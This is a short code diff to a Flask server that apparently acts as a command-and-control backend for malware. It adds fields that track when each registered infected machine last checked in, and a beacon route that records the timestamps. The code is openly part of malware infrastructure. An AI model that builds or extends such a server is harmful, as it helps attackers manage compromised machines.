@@ -26,6 +26,8 @@ def registry():
         "id": malwareRegistry,
         "ip": request.remote_addr,
         "os_signature": form_data['OS'],
+        "last_beconed" : "",
+        "logs" : "",
     }
     
 
@@ -36,7 +38,9 @@ def registry():
 
 @app.route("/becon")
 def becon():
-    print("beconed from malware")
+    form_data = request.form.to_dict()
+
+    fileOps.update_becon_malware(form_data["id"],form_data["timestamp"])
     return "you are now beconning"
 
 if __name__ == "__main__":
